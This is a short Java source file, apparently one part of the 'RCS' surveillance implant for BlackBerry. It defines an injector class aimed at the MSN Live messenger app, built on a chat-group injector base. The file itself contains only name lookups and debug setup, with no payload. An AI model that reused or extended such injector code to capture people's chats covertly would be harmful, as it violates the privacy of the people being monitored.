//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2012
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/

package blackberry.injection.injectors;

import blackberry.Messages;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.injection.injectors.group.ChatGroupInjector;

public class LiveInjector extends ChatGroupInjector {
    //#ifdef DEBUG
    private static Debug debug = new Debug("MLiveInjector", DebugLevel.VERBOSE); //$NON-NLS-1$

    //#endif
    public String getAppName() {
        // L.1=Live
        
        return Messages.getString("L.1"); //$NON-NLS-1$
    }

    public String getCodName() {
        // L.2=net_rim_bb_mslive
        return Messages.getString("L.2"); //$NON-NLS-1$
    }

}
